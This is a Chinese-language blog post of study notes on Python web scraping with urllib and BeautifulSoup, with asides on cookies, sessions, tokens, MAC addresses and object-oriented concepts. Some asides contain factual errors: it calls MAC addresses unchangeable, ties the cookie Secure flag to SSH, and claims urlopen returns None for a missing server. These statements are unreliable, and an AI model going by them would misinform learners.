    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/" class="post-title-link" itemprop="url">Python网络数据采集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-02 22:46:35 / Modified: 22:53:54" itemprop="dateCreated datePublished" datetime="2022-04-02T22:46:35+08:00">2022-04-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>34k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>31 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Python网络数据采集"><a href="#Python网络数据采集" class="headerlink" title="Python网络数据采集"></a>Python网络数据采集</h2><p>我最近一时兴起，想学一学爬虫，于是选择了这本书</p>
<p>通过这几天的学习，我的爬虫算是入门了，去网上爬一爬网图应该没有问题</p>
<p>但我暂时不打算继续深入了（后面的知识就比较专业了），这里就记录一下我的学习经过……</p>
<hr>
<h2 id="思考网络爬虫时通常的想法"><a href="#思考网络爬虫时通常的想法" class="headerlink" title="思考网络爬虫时通常的想法"></a>思考网络爬虫时通常的想法</h2><ul>
<li>通过网站域名获取 HTML 数据</li>
<li>根据目标信息解析数据</li>
<li>存储目标信息</li>
<li>如果有必要，移动到另一个网页重复这个过程 </li>
</ul>
<h2 id="PS-MAC地址"><a href="#PS-MAC地址" class="headerlink" title="PS:MAC地址"></a>PS:MAC地址</h2><p>MAC（Media Access Control，介质访问控制），或称为物理地址，MAC位址，硬件位址，用来定义网络设备的位置 </p>
<ul>
<li>第三层网络层负责 IP 地址，第二层数据链路层则负责 MAC 位址</li>
<li>因此一个主机会有一个IP地址，而每个网络位置会有一个专属于它的 MAC 位址 </li>
<li>MAC 地址，用来表示互联网上每一个站点的标识符，采用十六进制数表示，共六个字节(48位)</li>
<li>前三个字节是由 IEEE 的注册管理机构 RA 负责给不同厂家分配的代码(高位24位)，也称为“编制上唯一的标识符”(Organizationally Unique Identifier)</li>
<li>后三个字节(低位24位)由各厂家自行指派给生产的适配器接口，称为扩展标识符(唯一性)</li>
<li>一个地址块可以生成2^24个不同的地址</li>
<li>MAC地址实际上就是适配器地址或适配器标识符EUI-48</li>
</ul>
<p>MAC地址具有唯一性，它是雕在硬件设备上的（不能更改），生产厂家一生产就会把它分配给每个机器</p>
<h2 id="PS-Cookie"><a href="#PS-Cookie" class="headerlink" title="PS:Cookie"></a>PS:Cookie</h2><img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648896145659.png" class width="1648896145659"> 
<p>Cookie是保存在客户端的纯文本文件（比如txt文件）</p>
<p>所谓的客户端就是我们自己的本地电脑，当我们使用自己的电脑通过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑，这个证书就是Cookie</p>
<p>HTTP协议本身是无状态的（即服务器无法判断用户身份），客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用 response 向客户端浏览器颁发一个Cookie，客户端浏览器会把Cookie保存起来，当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器（添加到请求头中），服务器检查该Cookie，以此来辨认用户状态</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">属性项</th>
<th style="text-align:left">属性项介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">NAME=VALUE</td>
<td style="text-align:left">键值对，可以设置要保存的 Key/Value，注意这里的 NAME 不能和其他属性项的名字一样</td>
</tr>
<tr>
<td style="text-align:left">Expires</td>
<td style="text-align:left">过期时间，在设置的某个时间点后该 Cookie 就会失效</td>
</tr>
<tr>
<td style="text-align:left">Domain</td>
<td style="text-align:left">生成该 Cookie 的域名，如 domain=”<a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a>“</td>
</tr>
<tr>
<td style="text-align:left">Path</td>
<td style="text-align:left">该 Cookie 是在当前的哪个路径下生成的，如 path=/wp-admin/</td>
</tr>
<tr>
<td style="text-align:left">Secure</td>
<td style="text-align:left">如果设置了这个属性，那么只会在 SSH 连接时才会回传该 Cookie</td>
</tr>
</tbody>
</table>
</div>
<h2 id="PS-Session"><a href="#PS-Session" class="headerlink" title="PS:Session"></a>PS:Session</h2><p>Session是服务器为了保存用户状态而创建的一个特殊的对象（Session对象，用于储存特定的用户会话所需的信息）</p>
<p>当浏览器第一次访问服务器时，服务器创建一个 Session对象（该对象有一个唯一的ID，一般称之为SessionID），服务器会将 SessionID 以 Cookie 的方式发送给浏览器，当浏览器再次访问服务器时，会将 SessionID 发送过来，服务器依据 SessionID 就可以找到对应的 Session对象</p>
<p>服务器会向客户发送一个名为 JSESSIONID 的 Cookie ，它的值为该Session的ID，用于判断是否为同一用户</p>
<h2 id="PS-Token"><a href="#PS-Token" class="headerlink" title="PS:Token"></a>PS:Token</h2><p>Token，又称令牌，其实就是一种验证机制（和Cookie-Session效果类似）</p>
<p>用户请求登录时，服务器后端会生成一个 Token 存储于 Redis 数据库中（临时存放），然后把该 Token 返回到前端最终交给客户端，接下来用户再次请求时便会携带 Token 发送给服务器，服务器再去效验 Token 的正确性</p>
<h2 id="网络浏览器-amp-爬虫原理"><a href="#网络浏览器-amp-爬虫原理" class="headerlink" title="网络浏览器&amp;爬虫原理"></a>网络浏览器&amp;爬虫原理</h2><p>网络浏览器是一个非常有用的应用，它创建信息的数据包，发送它们，然后把你获取的数据解释成漂亮的图像、声音、视频和文字</p>
<p>但是，网络浏览器就是代码，而代码是可以分解的，可以分解成许多基本组件，可重写、重用，以及做成我们想要的任何东西</p>
<p><strong>网络浏览器可以让服务器发送一些数据，到那些对接无线（或有线）网络接口的应用上， 但是许多语言也都有实现这些功能的库文件</strong></p>
<p>也就是说，其他的编程语言也可以模仿浏览器的行为，从而向服务器请求数据，这便是网络爬虫的原理</p>
<p>让我们看看 Python 是如何实现的： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;https://ywhkkx.github.io/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(html.read())</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">b<span class="number">&#x27;</span>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;\n&lt;head&gt;\n  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;\n&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=......script src=&quot;</span>/js/next-boot.js<span class="string">&quot;&gt;&lt;/script&gt;\n\n\n\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n  \n\n&lt;/body&gt;\n&lt;/html&gt;\n&#x27; </span></span><br></pre></td></tr></table></figure>
<p>这将会输出 <code>https://ywhkkx.github.io/</code> 这个网页的全部 HTML 代码，更准确地说，这会输出在域名为 <code>ywhkkx.github.io</code> 的 github 服务器上文件夹里的 HTML 文件的源代码</p>
<p>现在大多数网页需要加载许多相关的资源文件：可能是图像文件、JavaScript 文件、CSS 文件，或你需要连接的其他各种网页内容</p>
<p>当网络浏览器遇到一个标签时，比如 <code>&lt;img src=&quot;cuteKitten.jpg&quot;&gt;</code> ，会向服务器发起另一个请求，以获取 cuteKitten.jpg 文件中的数据为用户充分渲染网页，但是，我们的 Python 程序没有返回并向服务器请求多个文件的逻辑，它只能读取我们已经请求的单个 HTML 文件，不过 Python 有对付的办法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br></pre></td></tr></table></figure>
<p>urllib 是 Python 的标准库，包含了从网络请求数据，处理 cookie，甚至改变像请求头和用户代理这些元数据的方法</p>
<p>urlopen 用来打开并读取一个从网络获取的远程对象，因为它是一个非常通用的库（它可以轻松读取 HTML 文件、图像文件，或其他任何文件流），所以我们将在本书中频繁地使用它 </p>
<h2 id="BeautifulSoup简介"><a href="#BeautifulSoup简介" class="headerlink" title="BeautifulSoup简介"></a>BeautifulSoup简介</h2><p>BeautifulSoup 尝试化平淡为神奇，它通过定位 HTML 标签来格式化和组织复杂的网络信息，用简单易用的 Python 对象为我们展现 XML 结构信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;https://ywhkkx.github.io/&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html.read(),<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(bsObj.h1) <span class="comment"># 这里只要求显示&quot;h1&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=</span><span class="string">&quot;site-title&quot;</span>&gt;Pwn进你的心&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现 BeautifulSoup 把原本的“杂乱无章”变成了“井井有条”</p>
<p>和前面例子一样，我们导入 urlopen，然后调用 html.read() 获取网页的 HTML 内容，这样就可以把 HTML 内容传到 BeautifulSoup 对象，转换成更加易读的结构，其实，任何 HTML（或 XML）文件的任意节点信息都可以被提取出来，只要目标信息的旁边或附近有标记就行</p>
<h2 id="“可靠”的网络连接"><a href="#“可靠”的网络连接" class="headerlink" title="“可靠”的网络连接"></a>“可靠”的网络连接</h2><p>网络是十分复杂的，网页数据格式不友好，网站服务器宕机，目标数据的标签找不到，都是很麻烦的事情</p>
<p>让我们看看爬虫 import 语句后面的第一行代码，如何处理那里可能出现的异常：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = urlopen(<span class="string">&quot;https://ywhkkx.github.io/&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这行代码主要可能会发生两种异常：</p>
<ul>
<li>网页在服务器上不存在（或者获取页面的时候出现错误）</li>
<li>服务器不存在 </li>
</ul>
<p>第一种异常发生时，程序会返回 HTTP 错误，HTTP 错误可能是 “404 Page Not Found” ，“500  Internal Server Error” 等，所有类似情形，urlopen 方法抛出“HTTPError”异常，我们可以用下面的方式处理这种异常：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    html = urlopen(<span class="string">&quot;https://ywhkkx.github.io/&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">else</span>:</span><br></pre></td></tr></table></figure>
<p>第一种异常发生时（服务器不存在），urlopen 会返回一个 None 对象，这个对象与其他编程语言中的 null 类似，我们可以增加一个判断语句检测返回的 html 是不是 None</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;URL is not found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br></pre></td></tr></table></figure>
<p>当然，即使网页已经从服务器成功获取，如果网页上的内容并非完全是我们期望的那样，仍然可能会出现异常，每当你调用 BeautifulSoup 对象里的一个标签时，增加一个检查条件保证标签确实存在是很聪明的做法</p>
<p>如果你想要调用的标签不存在，BeautifulSoup 就会返回 None 对象，不过，如果再调用这个 None 对象下面的子标签，就会发生 AttributeError 错误</p>
<p>比如下段代码：（nonExistentTag 是虚拟的标签，BeautifulSoup 对象里实际没有） </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(bsObj.nonExistentTag.someTag) </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;someTag&#x27;</span></span><br></pre></td></tr></table></figure>
<p>那么我们怎么才能避免这两种情形的异常呢？最简单的方式就是对两种情形进行检查： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    badContent = bsObj.nonExistingTag.anotherTag</span><br><span class="line"><span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tag was not found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> badContent == <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Tag was not found&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(badContent)</span><br></pre></td></tr></table></figure>
<p>初看这些检查与错误处理的代码会觉得有点儿累赘，但是，我们可以重新简单组织一下代码，让它变得不那么难写（更重要的是，不那么难读），例如，下面的代码是上面爬虫的另一种写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTitle</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = urlopen(url) <span class="comment"># 尝试获取html</span></span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e: <span class="comment"># 如果发生&quot;HTTP错误&quot;则返回None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bsObj = BeautifulSoup(html.read(),<span class="string">&quot;html.parser&quot;</span>) <span class="comment"># 尝试利用BeautifulSoup解析html</span></span><br><span class="line">        title = bsObj.body.h1</span><br><span class="line">    <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e: <span class="comment"># 如果&quot;没有获取到目标标签&quot;则返回None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line">title = getTitle(<span class="string">&quot;https://ywhkkx.github.io/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> title == <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Title could not be found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(title)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=</span><span class="string">&quot;site-title&quot;</span>&gt;Pwn进你的心&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
<p>在写爬虫的时候，思考代码的总体格局，让代码既可以捕捉异常又容易阅读，这是很重要的，如果你还希望能够很大程度地重用代码，那么拥有像 getSiteHTML 和 getTitle 这样的 通用函数（具有周密的异常处理功能）会让快速稳定地网络数据采集变得简单易行</p>
<h2 id="通过属性查找标签"><a href="#通过属性查找标签" class="headerlink" title="通过属性查找标签"></a>通过属性查找标签</h2><p>每个网站都会有层叠样式表（Cascading Style Sheet，CSS）</p>
<p>CSS 是专门为了让浏览器和人类可以理解网站内容而设计一个展现样式的层，但是 CSS 的发明却是网络爬虫的福音 </p>
<p>CSS 可以让 HTML 元素呈现出差异化，使那些具有完全相同修饰的元素呈现出不同的样式，比如，有一些标签看起来是这样：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">span</span> class=&quot;green&quot;&gt;&lt;/<span class="selector-tag">span</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">span</span> class=&quot;red&quot;&gt;&lt;/<span class="selector-tag">span</span>&gt;</span><br></pre></td></tr></table></figure>
<p>网络爬虫可以通过 class 属性的值，轻松地区分出两种不同的标签，如果我们想根据 class 属性来爬取需要的内容，就可以用到 findAll 方法</p>
<p>先看看目标网页：<a target="_blank" rel="noopener" href="https://www.pythonscraping.com/pages/warandpeace.html">https://www.pythonscraping.com/pages/warandpeace.html</a></p>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648641134068.png" class width="1648641134068"> 
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648641183645.png" class width="1648641183645"> 
<p>它的 html 结构很是简单，寻找 class 很是方便，我们可以用以下代码来爬取绿色字体的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;https://www.pythonscraping.com/pages/warandpeace.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">namelist = bsObj.findAll(<span class="string">&quot;span&quot;</span>,&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;green&quot;</span>&#125;) <span class="comment"># Python字典 - &#123;&quot;A&quot;:&quot;B&quot;&#125;</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> namelist:</span><br><span class="line">    <span class="built_in">print</span>(name.get_text()) <span class="comment"># get_text():把你正在处理的HTML文档中所有的标签都清除，返回一个只包含文字的字符串</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">Anna</span><br><span class="line">Pavlovna Scherer</span><br><span class="line">Empress Marya</span><br><span class="line">Fedorovna</span><br><span class="line">Prince Vasili Kuragin</span><br><span class="line">Anna Pavlovna</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<p>BeautifulSoup 里的 find() 和 findAll() 可能是你最常用的两个方法，借助它们，你可以通过标签的不同属性轻松地过滤 HTML 页面，查找需要的标签组或单个标签</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">findAll(tag, attributes, recursive, text, limit, keywords)</span><br><span class="line">find(tag, attributes, recursive, text, keywords)</span><br></pre></td></tr></table></figure>
<ul>
<li>tag：标签参数，可以传一个标签的名称或多个标签名称组成的Python列表做标签参数</li>
<li>attributes：属性参数，用一个Python字典封装一个标签的若干属性和对应的属性值</li>
<li>recursive：递归参数，这是一个布尔变量，设置为True，表示去查找目标标签中所有的子标签，设置为False，表示只查找一级标签（recursive默认为True）</li>
<li>text：文本参数，查找文本的内容（它是用标签的文本内容去匹配，而不是用标签的属性）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nameList = bsObj.findAll(text=<span class="string">&quot;the prince&quot;</span>) <span class="comment"># 查找&quot;the prince&quot;,返回所有的目标</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(nameList)) <span class="comment"># 结果为&quot;7&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>limit：限制参数，只用于 findAll 方法，find 其实等价于 findAll 的 limit 等于 1 时的情形，如果你只对网页中获取的前 x 项结果感兴趣，就可以设置它，但是要注意，这个参数设置之后，获得的前几项结果是按照网页上的顺序排序的，未必是你想要的那前几项 </li>
<li>keyword：关键词参数，让你选择那些具有指定属性的标签（这是一个冗余的参数）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allText = bsObj.findAll(id=<span class="string">&quot;text&quot;</span>)</span><br><span class="line">print(allText[<span class="number">0</span>].get_text())</span><br></pre></td></tr></table></figure>
<h2 id="PS-面向对象"><a href="#PS-面向对象" class="headerlink" title="PS:面向对象"></a>PS:面向对象</h2><p>面向对象(Object Oriented)是软件开发方法，一种编程范式，面向对象是一种对现实世界理解和抽象的方法，是计算机编程技术发展到一定阶段后的产物</p>
<p>通过面向对象的方式，将现实世界的事物抽象成对象，现实世界中的关系抽象成类、继承，帮助人们实现对现实世界的抽象与数字建模</p>
<p>面向对象是在结构化设计方法出现很多问题的情况下应运而生的</p>
<p>PS：结构化设计方法求解问题的基本策略是 <strong>从功能的角度审视问题域</strong> ，它将应用程序看成实现某些特定任务的 <strong>功能模块</strong> ，其中子过程是实现某项具体操作的底层功能模块，在每个功能模块中，用 <strong>数据结构描述待处理数据的组织形式，用算法描述具体的操作过程</strong>（把C语言的函数往里面套，可以方便理解）</p>
<p>面向对象的几大要数：</p>
<p>一，审视问题域的视角</p>
<ul>
<li>在现实世界中存在的客体是问题域中的主角（所谓客体是指客观存在的对象实体和主观抽象的概念），在自然界，每个客体都具有一些 <strong>属性和行为</strong> ，因此， <strong>每个个体都可以用属性和行为来描述</strong>（比如：IO_FILE文件系统中，就是用FILE结构体来描述整个文件）</li>
<li>结构化设计方法所采用的设计思路不是将客体作为一个整体，而是将依附于客体之上的行为抽取出来，以功能为目标来设计构造应用系统</li>
</ul>
<p>二，抽象级别</p>
<ul>
<li>抽象主要包括过程抽象和数据抽象（结构化设计方法应用的是过程抽象）</li>
<li>过程抽象：是将问题域中具有明确功能定义的操作抽取出来，并将其作为一个实体看待（比如C语言的函数）</li>
<li>数据抽象：数据抽象是较过程抽象更高级别的抽象方式，将描述客体的属性和行为绑定在一起，实现统一的抽象，从而达到对现实世界客体的真正模拟（说实话，这句话讲的也挺抽象的，不过看看上文中“BeautifulSoup”方法返回的那个“bsObj”，Python支持直接在它的身上使用函数，那么就可以把“bsObj”理解为某种抽象了）</li>
</ul>
<p>三，封装体 </p>
<ul>
<li>封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内， 该逻辑单元负责将所描述的属性隐藏起来，外界对客体内部属性的所有访问只能通过提供的用户接口实现（还是上文中提及的那个“bsObj”，它就是一个分装体）</li>
<li>结构化设计方法没有做到客体的整体封装，只是封装了各个功能模块，而每个功能模块可以随意地对没有保护能力客体属性实施操作，并且由于描述属性的数据与行为被分割开来，所以一旦某个客体属性的表达方式发生了变化，或某个行为效果发生了改变，就有可能对整个系统产生影响（想想C语言的函数，好像的确是这样）</li>
</ul>
<p>四，可重用性</p>
<ul>
<li>可重用性标识着软件产品的可复用能力，是衡量一个软件产品成功与否的重要标志</li>
</ul>
<p>面向对象的几大概念：</p>
<ul>
<li>对象：对象所指的是计算机系统中的某一个成分，它有两个含义：其中一个是数据，另外一个是动作，可以说对象则是数据和动作的结合体，对象不仅能够进行操作，同时还能够及时记录下操作结果</li>
<li>方法：方法是指对象能够进行的操作（方法同时还有另外一个名称：函数），方法是类中的定义函数，其具体的作用就是对对象进行描述操作</li>
<li>继承：继承简单地说就是一种层次模型，这种层次模型能够被重用，层次结构的上层具有通用性，但是下层结构则具有特殊性，在继承的过程中类则可以从最顶层的部分继承一些方法和变量（继承是从一般演绎到特殊的过程，可以减少知识表示的冗余内容，知识库的维护和修正都非常方便，更有利于衍生复杂的系统）</li>
<li>类：类是具有相同特性（数据元素）和行为（功能）的对象的抽象（因此，对象的抽象是类，类的具体化就是对象，也可以说类的实例是对象），类实际上就是一种数据类型，类具有属性，它是对象的状态的抽象，用数据结构来描述类的属性</li>
<li>封装：封装是将数据和代码捆绑到一起，对象的某些数据和代码可以是私有的，不能被外界访问，以此实现对数据和代码不同级别的访问权限</li>
<li>多态：多态是指不同事物具有不同表现形式的能力，多态机制使具有不同内部结构的对象可以共享相同的外部接口，通过这种方式减少代码的复杂度（一个接口，多种方式）</li>
<li>动态绑定：动态绑定指的是将一个过程调用与相应代码链接起来的行为，动态绑定是指与给定的过程调用相关联的代码只有在运行期才可知的一种绑定，它是多态实现的具体形式</li>
<li>消息传递：对象之间需要相互沟通，沟通的途径就是对象之间收发信息，消息内容包括接收消息的对象的标识，需要调用的函数的标识，以及必要的信息，消息传递的概念使得对现实世界的描述更容易</li>
</ul>
<h2 id="导航树"><a href="#导航树" class="headerlink" title="导航树"></a>导航树</h2><p>HTML 页面可以映射成一棵树 </p>
<p>在 BeautifulSoup 库里，孩子（child）和后代（descendant）有显著的不同：和人类的家谱一样，子标签就是一个父标签的下一级，而后代标签是指一个父标签下面所有级别的标签</p>
<p>一般情况下，BeautifulSoup 函数总是处理当前标签的后代标签（例如，bsObj.body.h1 选择了 body 标签后代里的第一个 h1 标签，不会去找 body 外面的标签）</p>
<p>接下来介绍几个标签处理的方法：</p>
<p><strong>如果你只想找出子标签，可以用 .children</strong>（程序默认选择 .children）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> bsObj.find(<span class="string">&quot;table&quot;</span>,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;giftList&quot;</span>&#125;).children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br></pre></td></tr></table></figure>
